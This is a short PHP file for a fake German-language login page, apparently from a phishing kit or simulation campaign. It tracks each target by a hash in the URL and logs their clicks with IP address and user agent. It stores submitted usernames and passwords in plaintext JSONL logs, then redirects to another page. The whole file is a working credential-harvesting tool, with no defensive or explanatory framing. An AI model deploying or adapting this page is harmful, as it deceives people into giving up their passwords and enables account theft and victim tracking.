<?php
function findLogFile($hash){
    foreach(glob(__DIR__.'/logs/*.jsonl') as $f){
        $h=fopen($f,'r');
        while(($line=fgets($h))!==false){
            $d=json_decode($line,true);
            if($d && isset($d['hash']) && $d['hash']===$hash) { fclose($h); return $f; }
        }
        fclose($h);
    }
    return null;
}

$hash = $_GET['id'] ?? '';
$logFile = $hash ? findLogFile($hash) : null;
if($hash && $logFile){
    $event=['event'=>'clicked','hash'=>$hash,'time'=>time(),'ip'=>$_SERVER['REMOTE_ADDR'],'ua'=>$_SERVER['HTTP_USER_AGENT']];
    file_put_contents($logFile,json_encode($event)."\n",FILE_APPEND);
}
if($_SERVER['REQUEST_METHOD']=='POST' && $hash && $logFile){
    $event=['event'=>'submitted','hash'=>$hash,'time'=>time(),'user'=>$_POST['user']??'','pass'=>$_POST['pass']??''];
    file_put_contents($logFile,json_encode($event)."\n",FILE_APPEND);
    header('Location: guru.php?id=' . urlencode($hash));
    exit;
}
?>
<!DOCTYPE html>
<html><body>
<h2>Login</h2>
<form method="post">
<label>Benutzer:<input type="text" name="user"></label><br>
<label>Passwort:<input type="password" name="pass"></label><br>
<input type="submit" value="Login">
</form>
</body></html>
